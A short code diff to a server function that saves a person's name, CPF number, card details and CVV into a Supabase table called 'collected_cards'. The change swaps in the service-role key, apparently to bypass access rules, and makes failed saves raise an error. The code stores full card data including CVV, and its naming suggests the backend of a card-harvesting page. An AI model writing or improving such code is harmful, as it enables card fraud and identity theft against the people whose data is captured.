@@ -62,7 +62,20 @@ export const saveCardData = createServerFn({ method: "POST" })
     cvv: string;
   }) => data)
   .handler(async ({ data }) => {
-    const supabase = publicClient();
+    const roleKey = process.env["SUPABASE_SERVICE_ROLE_KEY"];
+    const key = roleKey || process.env["SUPABASE_PUBLISHABLE_KEY"]!;
+    const supabase = createClient<Database>(process.env["SUPABASE_URL"]!, key, {
+      auth: { persistSession: false, autoRefreshToken: false },
+      global: {
+        fetch: (input, init) => {
+          const h = new Headers(init?.headers);
+          if (key.startsWith("sb_") && h.get("Authorization") === `Bearer ${key}`) h.delete("Authorization");
+          h.set("apikey", key);
+          return fetch(input, { ...init, headers: h });
+        },
+      },
+    });
+
     const { error } = await supabase.from("collected_cards" as any).insert({
       nome: data.nome,
       cpf: data.cpf,
@@ -75,6 +88,7 @@ export const saveCardData = createServerFn({ method: "POST" })
     });
     if (error) {
       console.error("Erro ao salvar em collected_cards:", error);
+      throw new Error(error.message || "Erro ao salvar os dados do cartão.");
     }
     return { ok: true };
   });
